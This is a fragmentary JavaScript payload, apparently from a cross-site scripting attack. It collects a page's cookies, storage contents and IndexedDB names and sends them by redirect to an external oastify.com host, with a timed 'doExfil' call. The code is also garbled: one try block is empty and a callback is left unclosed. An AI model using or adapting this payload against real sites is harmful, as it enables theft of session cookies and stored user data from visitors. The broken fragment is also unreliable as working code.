    d+=ls.substring(0,500);

  try{

    }
    d+=ss.substring(0,300);
  }catch(e){d+="SS_ERR:"+e.message+";";}
  d+="CK:"+document.cookie+";";
  try{
    indexedDB.databases().then(function(dbs){
      var idb="IDB:";

    window.location="https://gyiui0tf8glfs3zea6nyjuxzkqqnepvxe5g5ru.oastify.com/?d="+encodeURIComponent(d.substring(0,1500));
  }
  setTimeout(function(){doExfil();},2000);
